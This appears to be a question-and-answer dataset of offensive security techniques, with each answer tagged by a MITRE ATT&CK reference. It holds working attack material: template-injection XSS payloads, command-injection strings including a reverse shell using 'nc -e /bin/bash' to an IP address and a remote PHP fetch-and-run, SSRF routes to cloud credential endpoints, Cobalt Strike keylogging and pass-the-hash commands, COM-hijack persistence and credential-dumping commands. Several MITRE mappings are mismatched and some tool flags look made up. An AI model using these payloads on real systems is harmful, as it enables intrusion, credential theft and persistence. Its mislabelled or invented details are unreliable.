``` MITRE References: MITRE ID is T1template, MITRE Name is: Template Injection, and MITRE Tactics are: TA0042.

## Q: What are some example payloads for exploiting CSTI vulnerabilities in Mavo applications?
A: Some example payloads for exploiting CSTI vulnerabilities in Mavo applications include:
```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
``` MITRE References: MITRE ID is T1template, MITRE Name is: Template Injection, and MITRE Tactics are: TA0042.

## Q: How can I clone a website using the Social Engineering Toolkit?
A: To clone a website using the Social Engineering Toolkit, you can use the tool available at https://github.com/trustedsec/social-engineer-toolkit. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing for Information, and MITRE Tactics are: Reconnaissance.

## Q: How could you use cloud-enum to perform reconnaissance on AWS S3 buckets?
A: To use cloud-enum to enumerate public AWS S3 buckets, you can run the following command:

```bashcloud_enum -k s3 --disable-azure --disable-gcp```
This will search for and list any publicly accessible S3 buckets. You can also use the `-l` and `-f` options to save the results to a log file in the desired format (text, JSON, or CSV).

MITRE_ID: T1069
MITRE_Name: Information Collection
MITRE_Tactics: [TA0001] MITRE References: MITRE ID is T1069, MITRE Name is: Information Collection, and MITRE Tactics are: TA0001.

## Q: How can you use cloud-enum to discover unprotected Google Cloud Storage Buckets?
A: To use cloud-enum to find unprotected Google Cloud Storage Buckets, you can run the following command:

```bashcloud_enum -k gcp --disable-aws --disable-azure```
This will search for and list any publicly accessible GCP buckets. You can also use the `-l` and `-f` options to save the results to a log file in the desired format (text, JSON, or CSV).

MITRE_ID: T1083
MITRE_Name: File and Directory Discovery
MITRE_Tactics: [TA0007] MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: TA0007.

## Q: How can cloudbrute be leveraged during a CTF event to find hidden or overlooked cloud resources belonging to the target organization?
A: In a CTF scenario, CloudBrute can be used to aggressively enumerate cloud-based assets that may be part of the target infrastructure. By providing relevant keywords, domains, and wordlists, CloudBrute can scan for potential cloud storage buckets, applications, and other resources that could contain valuable information or weaknesses. This type of targeted cloud reconnaissance can help identify overlooked or hidden cloud assets that could be leveraged to progress through the CTF challenge. The concurrent scanning capabilities and support for major cloud providers makes CloudBrute a useful tool for CTF events involving cloud-based targets. Version 1.0.7 of CloudBrute was used for this example. MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can you access the AWS ECS (Container Service) credentials via SSRF?
A: If you manage to compromise a service running in ECS, the metadata endpoints change. If you access `http://169.254.170.2/v2/credentials/<GUID>` you will find the credentials of the ECS machine. But first you need to find the <GUID>. To find the <GUID> you need to read the `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable inside the machine, which you could do by exploiting a Path Traversal to `file:///proc/self/environ`. The mentioned http address should give you the AccessKey, SecretKey and token. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can you access the AWS Lambda function credentials via SSRF?
A: In this case the credentials are stored in environment variables. So, to access them you need to access something like `file:///proc/self/environ`. The names of the interesting environment variables are `AWS_SESSION_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and `AWS_ACCES_KEY_ID`. Additionally, Lambda functions also have event data that is passed to the function when it is started, which could contain sensitive information (like `stageVariables`), and this data is accessible over standard SSRF at `http://localhost:9001/2018-06-01/runtime/invocation/next`. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can you access the AWS Elastic Beanstalk credentials via SSRF?
A: First, we retrieve the `accountId` and `region` from the API using `http://169.254.169.254/latest/dynamic/instance-identity/document` and `http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role`. Then, we retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API using `http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role`. Finally, we use these credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can you access the Google Cloud metadata service via SSRF?
A: Requires the HTTP header `Metadata-Flavor: Google` and you can access the metadata endpoint with the following URLs: `http://169.254.169.254`, `http://metadata.google.internal`, and `http://metadata`. Interesting endpoints to extract information include `/project`, `/oslogin`, `/instance`, and `/service-accounts`. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can you access the Digital Ocean metadata service via SSRF?
A: The documentation is available at `https://developers.digitalocean.com/documentation/metadata/`. You can access the metadata using URLs like `http://169.254.169.254/metadata/v1/id`, `http://169.254.169.254/metadata/v1.json`, `http://169.254.169.254/metadata/v1/user-data`, etc. There aren't things like AWS Roles or GCP service accounts, so you won't find metadata bot credentials. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can you access the Azure VM metadata service via SSRF?
A: The requests must contain the header `Metadata: true` and must not contain an `X-Forwarded-For` header. You can access the metadata using URLs like `http://169.254.169.254/metadata/instance?api-version=2021-12-13` to get instance details, `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/` to get a management token, and so on. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can you access the Azure App Service metadata service via SSRF?
A: From the environment, you can get the values of `IDENTITY_HEADER` and `IDENTITY_ENDPOINT`. You can then use those to gather a token to speak with the metadata server, often for resources like `https://storage.azure.com`, `https://vault.azure.net`, `https://graph.microsoft.com`, or `https://management.azure.com`. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can you access the IBM Cloud metadata service via SSRF?
A: In IBM Cloud, metadata is not enabled by default, so you may not be able to access it even if you are inside an IBM Cloud VM. However, if it is enabled, you can access the metadata using the `instance_identity_token` obtained from a PUT request to `http://169.254.169.254/instance_identity/v1/token?version=2022-03-01`. You can then use that token to access various metadata endpoints like `/metadata/v1/instance`, `/metadata/v1/keys`, `/metadata/v1/placement_groups`, and `/instance_identity/v1/iam_token`. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: TA0007.

## Q: How can cmospwd version 5.0 be used to disable a BIOS password?
A: To disable a BIOS password using cmospwd version 5.0, you can run it with the /k flag:cmospwd /kThis will attempt to clear or 'kill' the CMOS password, effectively disabling the BIOS password. Keep in mind that this may not work for all BIOS types, and could potentially cause other issues, so use this functionality with caution. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Credential Access, Persistence.

## Q: How can CMSeeK v1.1.3 be used to detect and exploit common content management systems (CMS) like WordPress, Joomla, and Drupal?
A: CMSeeK v1.1.3 is a powerful tool for detecting and exploiting common CMS platforms. To use it, you can run the following command:

```python3 cmseek.py -u <target_url>```

This will perform a guided scan of the target URL, detecting the CMS and potentially finding vulnerabilities. You can also perform a more targeted scan by specifying the CMS to check against using the `--strict-cms` option, or skip certain CMS checks using `--ignore-cms`. CMSeeK supports over 180 different CMS platforms and can automate exploitation of common vulnerabilities once the CMS is identified. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can CMSeeK v1.1.3 be used to perform reconnaissance on a target website to gather information about its underlying CMS and potential weaknesses?
A: CMSeeK v1.1.3 can be used to perform reconnaissance on a target website to gather information about its underlying CMS and potential weaknesses. To do this, you can run the following command:

```python3 cmseek.py -u <target_url> --light-scan```

This will perform a quick scan to detect the CMS and version, without performing a deep scan or exploitation. You can also use the `--only-cms` option to only detect the CMS, without any further analysis. The information gathered can be used to research known vulnerabilities and plan a more targeted attack. MITRE References: MITRE ID is T1590, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: Discovery.

## Q: How can CMSeeK v1.1.3 be used to automate the exploitation of common CMS vulnerabilities?
A: CMSeeK v1.1.3 can be used to automate the exploitation of common CMS vulnerabilities once the CMS has been identified. To do this, you can run the following command:

```python3 cmseek.py -u <target_url>```

This will perform a guided scan of the target URL, detecting the CMS and then attempting to exploit any known vulnerabilities. CMSeeK supports over 180 different CMS platforms and can automate the exploitation of common vulnerabilities. However, it's important to note that automated exploitation should be used with caution and only on systems you have explicit permission to test. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution, Lateral Movement.

## Q: How could an attacker leverage cntlm to help with lateral movement in a network?
A: In version 0.92.3, cntlm can be used to establish a TCP/IP tunnel through an NTLM-authenticated proxy. An attacker could potentially use this functionality to pivot through the proxy and gain access to other systems on the network that would otherwise be inaccessible. By configuring cntlm with valid NTLM credentials, the attacker could route their traffic through the proxy to bypass network segmentation and move laterally within the target environment. MITRE References: MITRE ID is T1090, MITRE Name is: Connection Proxy, and MITRE Tactics are: Lateral Movement, Command and Control.

## Q: How can you generate and host a script/executable to download a Cobalt Strike beacon?
A: To generate a script/executable to download a Cobalt Strike beacon, go to `Attacks -> Web Drive-by -> Scripted Web Delivery (S)`. This will generate a script/executable in formats such as bitsadmin, exe, powershell and python to download the beacon from Cobalt Strike. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: How can you use a keylogger in Cobalt Strike?
A: To use a keylogger in Cobalt Strike, use the following command:

```keylogger [pid] [x86|x64]```

You can view the logged keystrokes in the `View -> Keystrokes` menu. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Collection.

## Q: How can you use Pass the Hash in Cobalt Strike?
A: To use Pass the Hash in Cobalt Strike, you can use the following commands:

```pth [pid] [arch] [DOMAIN\user] [NTLM hash]pth [DOMAIN\user] [NTLM hash]```

This modification process requires patching of LSASS memory, which is a high-risk action, requires local admin privileges, and may not be viable if Protected Process Light (PPL) is enabled. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: Lateral Movement, Credential Access.

## Q: How can you use code-oss for privilege escalation and lateral movement on a compromised Linux system?
A: The code-oss editor can be leveraged for various post-exploitation activities on a compromised Linux system. With code-oss, you can access and modify sensitive files, create persistent access, and potentially elevate privileges. For example, you could use code-oss to edit system configuration files, add malicious code to startup scripts, or insert backdoors into existing applications. Additionally, code-oss provides a graphical interface to navigate the file system, making it easier to identify and exfiltrate sensitive data. However, the specific techniques would depend on the context and the vulnerabilities present on the target system. It's important to use such tools responsibly and only for authorized security testing. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you use code-oss to create malicious scripts or payloads for use in red team or penetration testing activities?
A: Code-oss can be used to create and develop malicious scripts or payloads for use in red team or penetration testing activities. Its powerful editing capabilities, support for various programming languages, and integration with version control systems can facilitate the creation, testing, and deployment of custom payloads. For example, you could use code-oss to write Bash scripts that perform system reconnaissance, establish reverse shells, or automate lateral movement. Additionally, the ability to easily insert and modify code within code-oss can aid in the development of more sophisticated payloads, such as those that leverage vulnerabilities or exploit system weaknesses. However, it's crucial to use such capabilities responsibly and only for authorized security assessments, while ensuring strict control over the creation and distribution of any malicious content. MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: What are some ways to execute multiple commands in a Command Injection?
A: To execute multiple commands, you can try the following:- Both Unix and Windows supported:  - `ls||id; ls ||id; ls|| id; ls || id` (Execute both)  - `ls|id; ls |id; ls| id; ls | id` (Execute both using a pipe)  - `ls&&id; ls &&id; ls&& id; ls && id` (Execute 2Â° if 1Â° finish ok)  - `ls&id; ls &id; ls& id; ls & id` (Execute both but you can only see the output of the 2Â°)  - `ls %0A id` (Execute both using %0A)- Only Unix supported:  - `` `ls` ``   - `$(ls)`  - `ls; id` (Chain commands)  - `ls${LS_COLORS:10:1}${IFS}id` (Might be useful) MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: What are some examples of Command Injection payloads?
A: Here are some example Command Injection payloads:- `vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php`- `vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80`- `vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay` MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can commix be used to read, write, and upload files on a compromised server?
A: Commix (version 1.7-stable) provides options to read, write, and upload files on a compromised server. For example, to read the contents of a file '/var/www/html/commix-testbed/scenarios/referer/index.html', the following command can be used:

commix(os_shell) > --file-read=/var/www/html/commix-testbed/scenarios/referer/index.html

To write to a file '/tmp/test.txt', the following command can be used:

commix(os_shell) > --file-write=/tmp/test.txt --file-dest=/tmp/test.txt

And to upload a local file 'local_file.txt' to the remote server at '/tmp/remote_file.txt', the following command can be used:

commix(os_shell) > --file-upload=local_file.txt --file-dest=/tmp/remote_file.txt MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: Lateral Movement.

## Q: How can commix be used to perform system enumeration on a compromised server?
A: Commix (version 1.7-stable) provides options to enumerate various system information on a compromised server, such as the current user, hostname, privilege level, system users, and password hashes. For example, to retrieve the current user name, the following command can be used:

commix(os_shell) > --current-user

To check if the current user has root or admin privileges, the following commands can be used:

commix(os_shell) > --is-root
commix(os_shell) > --is-admin

To retrieve a list of system users, the following command can be used:

commix(os_shell) > --users

And to retrieve the password hashes for those users, the following command can be used:

commix(os_shell) > --passwords MITRE References: MITRE ID is T1033, MITRE Name is: System Owner/User Discovery, and MITRE Tactics are: Discovery.

## Q: What are some other miscellaneous techniques used in malware?
A: Some other miscellaneous techniques used in malware include:

- `GetAsyncKeyState()` - Key logging
- `SetWindowsHookEx` - Key logging
- `GetForeGroundWindow` - Get running window name (or website from a browser)
- `LoadLibrary()` - Import library
- `GetProcAddress()` - Import library
- `CreateToolhelp32Snapshot()` - List running processes
- `GetDC()` - Screenshot
- `BitBlt()` - Screenshot
- `InternetOpen()`, `InternetOpenUrl()`, `InternetReadFile()`, `InternetWriteFile()` - Access the Internet
- `FindResource()`, `LoadResource()`, `LockResource()` - Access resources of the executable MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: As an attacker, how can you leverage 4648 logon with explicit credential events in your post-exploitation activities?
A: You can use compromised credentials to start new logon sessions with explicit alternate credentials (generating 4648 events). This allows you to chain compromised accounts and traverse across different systems and privilege levels. You can use runas.exe with /netonly to pass alternate creds without creating a new logon session. Monitor for suspicious runas usage in event 4688 (process creation). MITRE References: MITRE ID is T1021.001, MITRE Name is: Remote Desktop Protocol, and MITRE Tactics are: Lateral Movement.

## Q: How can you remotely enumerate local group memberships on a target and generate 4798 events?
A: You can use 'net group /domain' to list all domain groups, and 'net group 'groupname' /domain' to list members of a specific group. Powerview has Get-NetLocalGroup and Get-NetLocalGroupMember which take a computername argument to do this remotely. The Bloodhound tool also collects this data from remote hosts, or you can use the Sharphound ingestor to gather the data. MITRE References: MITRE ID is T1069.001, MITRE Name is: Local Groups, and MITRE Tactics are: Discovery.

## Q: How can you find not existent COM components that could be used for persistent mechanisms using COM Hijacking?
A: Use `procmon` to find `RegOpenKey` operations where the *Result* is **NAME NOT FOUND** and the *Path* ends with **InprocServer32**. Once you have decided which not existent COM to impersonate, execute the following commands:

```
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
``` MITRE References: MITRE ID is T1087, MITRE Name is: Account Discovery, and MITRE Tactics are: TA0007.

## Q: How can you find hijackable Task Scheduler COM components that could be used for persistence?
A: Use the following PowerShell commands to find COM CLSIDs used by Scheduled Tasks:

```$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

Check if the CLSID doesn't exist in HKCU, then you can create the HKCU entry to achieve persistence. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: TA0003.

## Q: How can an attacker inject a note with as many `<img>` tags loading `/js/purify.js` as possible to block the origin?
A: The attacker can inject a note with as many `<img>` tags loading `/js/purify.js` as possible (more than 6 to block the origin). This is done by constructing a payload that contains the prefix of the flag and the maximum number of `<img>` tags pointing to `/js/purify.js`. The attacker then adds this payload as a note, which will load the `purify.js` script many times and block the origin. MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: How can an attacker remove the note with index 1 to leave only the note with the flag or the injection?
A: The attacker can remove the note with index 1 using the `remove_note` function, which creates a form, sets the `index` field to 1, and submits the form to the `/remove` endpoint. This removes the note with index 1, leaving only the note with the flag or the injection. MITRE References: MITRE ID is T1070, MITRE Name is: Indicator Removal on Host, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker make the bot access the page with the remaining note and send a request to `victim.com/js/purify.js` that is timed?
A: The code does not explicitly show how the attacker makes the bot access the page with the remaining note. However, the attacker can likely use a technique like triggering a beacon or sending a request to the page to force the bot to load it and access the `victim.com/js/purify.js` script. The timing of the request to `victim.com/js/purify.js` can then be used to determine if the flag or the injection was in the remaining note. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you obtain a TGT ticket that can be used to impersonate users using constrained delegation?
A: To obtain a TGT ticket that can be used to impersonate users using constrained delegation, you can follow these steps:

1. Get a TGT of the service that can impersonate others. If you are SYSTEM on the server, you can dump it from memory using Rubeus.
2. If you have the AES key or RC4 hash of the service, you can request a new TGT using Rubeus.
3. With the TGT ticket, you can then use Rubeus to obtain a TGS for the Administrator user and other services, and impersonate the Administrator user. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberos Ticket Abuse, and MITRE Tactics are: PrivilegeEscalation, Persistence, Lateral Movement.

## Q: How can you use Kekeo and Mimikatz to abuse constrained delegation?
A: To abuse constrained delegation using Kekeo and Mimikatz, you can follow these steps:

1. Obtain a TGT for the constrained allowed user using Kekeo's `tgt::ask` command.
2. Use Kekeo's `tgs::s4u` command to get a TGS for the service you are allowed to access, as well as for other services.
3. Load the TGS into memory using Mimikatz's `kerberos::ptt` command. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberos Ticket Abuse, and MITRE Tactics are: PrivilegeEscalation, Persistence, Lateral Movement.

## Q: How can you bypass Content Security Policy (CSP) using 'unsafe-inline' and Iframes?
A: Using the 'unsafe-inline' directive in the CSP policy and combining it with Iframes can allow bypassing the CSP. By injecting payload in the Iframe's source, the 'unsafe-inline' directive can be used to execute arbitrary JavaScript code. MITRE References: MITRE ID is T1539, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006, TA0009.

## Q: How can you bypass Content Security Policy (CSP) using 'unsafe-eval'?
A: The 'unsafe-eval' directive in the CSP policy can be abused to bypass the policy. By using a data URI with a Base64 encoded script, the 'unsafe-eval' directive can be used to execute arbitrary JavaScript code. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0005.

## Q: How can you bypass Content Security Policy (CSP) using strict-dynamic?
A: The 'strict-dynamic' directive in the CSP policy can be used to bypass the policy. If a script is whitelisted using a nonce or hash, 'strict-dynamic' allows that script to load new scripts, effectively bypassing the CSP restrictions. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: TA0005.

## Q: How can you bypass Content Security Policy (CSP) using a wildcard (*)?
A: Using a wildcard (*) in the CSP policy can lead to bypass opportunities. By including the wildcard in directives like 'script-src', it's possible to load scripts from any source, effectively bypassing the CSP restrictions. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can the script be used to exploit a functionality that allows the user to insert any amount of cookies?
A: The script is exploiting a functionality that allows the user to insert any amount of cookies, and then loading a file as a script knowing that the true response will be larger than the false one. If successful, the response is a redirect with a resulting URL longer, too large to handle by the server so it returns an error HTTP status code. If the search fails, nothing will happen because the URL is short. MITRE References: MITRE ID is T1564, MITRE Name is: Hide Artifacts, and MITRE Tactics are: TA0005.

## Q: How can an attacker control a subdomain or find an XSS in a subdomain to perform a Cookie Tossing attack?
A: If an attacker can control a subdomain or find an XSS in a subdomain, they will be able to perform a Cookie Tossing attack. When a cookie is set to a domain (specifying it), it will be used in the domain and subdomains. Therefore, an attacker can set a specific cookie to the domain and subdomains by doing something like `document.cookie="session=1234; Path=/app/login; domain=.example.com"`. MITRE References: MITRE ID is T1606.001, MITRE Name is: Web Session Cookie, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can an attacker use Cookie Tossing to fixate the victim's cookie to the attacker's account?
A: An attacker can use Cookie Tossing to fixate the cookie of the victim to the attacker's account. If the cookie doesn't change after login, the attacker may just fixate a cookie (session-fixation), wait until the victim logs in and then use that cookie to log in as the victim. This allows the attacker to potentially obtain sensitive information from the victim's account. MITRE References: MITRE ID is T1606.001, MITRE Name is: Web Session Cookie, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can an attacker use Cookie Tossing to abuse a CSRF token?
A: If the cookie is setting some initial value (like in Flask where the cookie may set the CSRF token of the session and this value will be maintained after the victim logs in), the attacker may set this known value and then abuse it. The attacker could also get an unauthenticated cookie generated by the server, get the CSRF token from it, and use it. MITRE References: MITRE ID is T1556.003, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can the 'Access-Control-Request-Local-Network' and 'Access-Control-Allow-Local-Network' headers be used to bypass CORS restrictions for local network requests?
A: The 'Access-Control-Request-Local-Network' header is included in the client's request to signify that the inquiry is aimed at a local network resource. In response, servers can use the 'Access-Control-Allow-Local-Network' header to communicate that the requested resource is permitted to be shared with entities outside of the local network. This allows controlled access to local network resources while maintaining security protocols. Additionally, the Linux '0.0.0.0' IP address can be used to bypass these local network requirements and access localhost. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can XSSI (Cross-Site Script Inclusion) / JSONP be used to bypass CORS restrictions?
A: XSSI, also known as Cross-Site Script Inclusion, takes advantage of the fact that the Same Origin Policy (SOP) does not apply when including resources using the script tag. This allows an attacker to access and read any content that was included using the script tag, including dynamic JavaScript or JSONP (JSON with Padding). By adding a 'callback' parameter to the request, the page may be prepared to send the data as JSONP, which will bypass the CORS policy. MITRE References: MITRE ID is T1105, MITRE Name is: Ingress Tool Transfer, and MITRE Tactics are: Command and Control.

## Q: How can DNS rebinding techniques be used to bypass CORS restrictions?
A: DNS rebinding involves manipulating DNS records to bypass security measures. An attacker can create a web page, make the victim access it, and then change the DNS (IP) of their own domain to point to the victim's web page. When the victim's browser cache expires, it makes a new DNS request, allowing the attacker to execute JavaScript code on the victim's page. This can be used to bypass explicit IP checks or scenarios where a user or bot remains on the same page for an extended period. Tools like DNSrebinder can be used to run your own DNS rebinding server. MITRE References: MITRE ID is T1102, MITRE Name is: Web Service, and MITRE Tactics are: Command and Control.

## Q: How can you use cowpatty to perform a brute-force dictionary attack against a WPA-PSK network?
A: To perform a brute-force dictionary attack against a WPA-PSK network using cowpatty, follow these steps:1. Capture the 4-way handshake during the WPA authentication process using a tool like Wireshark or aircrack-ng.2. Create a dictionary file containing potential passphrases to test.3. Run the cowpatty command with the following arguments:   - '-f': Specify the dictionary file containing the passphrases to test.   - '-r': Provide the packet capture file containing the 4-way handshake.   - '-s': Specify the SSID (network name) of the target network.4. cowpatty will then attempt to crack the WPA-PSK passphrase by testing the passphrases in the dictionary file against the captured 4-way handshake.Example usage (cowpatty version 4.8):```root@kali:~# cowpatty -f /path/to/dictionary.txt -r capture.pcap -s 'MyWiFiNetwork'```This command will perform a brute-force attack on the WPA-PSK network with the SSID 'MyWiFiNetwork' using the passphrases in the 'dictionary.txt' file. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can the Crack-Reporter tool be used to generate a report of cracked passwords?
A: The Crack-Reporter tool is used in conjunction with the Crack tool to generate a report of passwords that have been successfully cracked. To use Crack-Reporter, run the command 'Crack-Reporter' which will output a report showing the passwords that have been cracked, as well as any errors or warnings that occurred during the cracking process. The report is generated based on the Crack tool's cracking activities. Version 5.0a of Crack-Reporter is available in the Kali Linux distribution. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: CredentialAccess, Discovery.

## Q: How can CrackMapExec be used to execute a Mimikatz or shellcode injection attack against a Windows system?
A: CrackMapExec can be used to execute Mimikatz or shellcode injection attacks against Windows systems using the 'exec' module. The following command can be used to inject Mimikatz into memory and dump credentials:

`crackmapexec smb <target_ip_or_range> -u <username> -p <password> --exec-method smbexec --mimikatz`

To inject custom shellcode, you can use the following command:

`crackmapexec smb <target_ip_or_range> -u <username> -p <password> --exec-method smbexec --shellcode <path/to/shellcode.bin>`

These attacks allow the attacker to gain access to sensitive information and further compromise the target environment without uploading any binaries. MITRE References: MITRE ID is T1106, MITRE Name is: execution, and MITRE Tactics are: Execution.

## Q: How can CrackMapExec be used to dump the NTDS.dit file from a Windows domain controller?
A: CrackMapExec can be used to dump the NTDS.dit file from a Windows domain controller using the 'dcsync' module. The following command can be used:

`crackmapexec smb <dc_ip_address> -u <username> -p <password> --dumpdomain`

This will extract the NTDS.dit file contents, including password hashes, from the domain controller. The extracted data can then be used for further attacks, such as cracking the passwords or using the hashes to gain unauthorized access to other systems in the domain. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can I create a malicious MSI using WIX tools?
A: To create a malicious MSI using WIX tools, follow these steps:1. Use the `candle.exe` tool from the WIX toolset to generate a WIX object from the MSI.XML file:```candle.exe -out C:\tmp\wix C:\tmp\Ethereal\msi.xml```2. Use the `light.exe` tool from the WIX toolset to create the MSI file from the WIX object:```light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix```The MSI file will execute the specified command (in this case, `cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"`) when installed. MITRE References: MITRE ID is T1202, MITRE Name is: Indirect Command Execution, and MITRE Tactics are: Execution.

## Q: How can creddump7 be used to extract Windows credentials from a target system?
A: creddump7 is a Python tool that can be used to extract various credentials and secrets from Windows registry hives. The `lsadump.py` script in creddump7 can be used to dump the LSA (Local Security Authority) secrets, which can contain password hashes, Kerberos tickets, and other sensitive information. To use creddump7, you would first need to obtain a copy of the target system's registry hives, such as by using a tool like Reg Ripper. Then you can run `python lsadump.py <system hive> <security hive>` to extract the LSA secrets. creddump7 version 0.1+git20190429-1.1. MITRE References: MITRE ID is T1003, MITRE Name is: Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can creddump7 be used to extract cached domain credentials from a Windows system?
A: The `cachedump.py` script in creddump7 can be used to extract cached domain credentials from the Windows registry. Cached credentials are stored in the Security Account Manager (SAM) hive and can be useful for offline password cracking or lateral movement. To use cachedump.py, you would need to obtain a copy of the SAM and SYSTEM registry hives from the target system. Then you can run `python cachedump.py <system hive> <sam hive>` to extract the cached credentials. creddump7 version 0.1+git20190429-1.1. MITRE References: MITRE ID is T1003, MITRE Name is: Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can creddump7 be used to extract Windows password hashes from a target system?
A: The `pwdump.py` script in creddump7 can be used to extract Windows password hashes from the SAM (Security Accounts Manager) registry hive. This can be useful for offline password cracking or lateral movement within a network. To use pwdump.py, you would need to obtain a copy of the SAM and SYSTEM registry hives from the target system. Then you can run `python pwdump.py <system hive> <sam hive>` to extract the password hashes. creddump7 version 0.1+git20190429-1.1. MITRE References: MITRE ID is T1003, MITRE Name is: Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How do you clear event logs using Mimikatz?
A: Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer). MITRE References: MITRE ID is T1565, MITRE Name is: Data Manipulation, and MITRE Tactics are: TA0005.

## Q: How do you patch the Event Logging Service to prevent recording new events using Mimikatz?
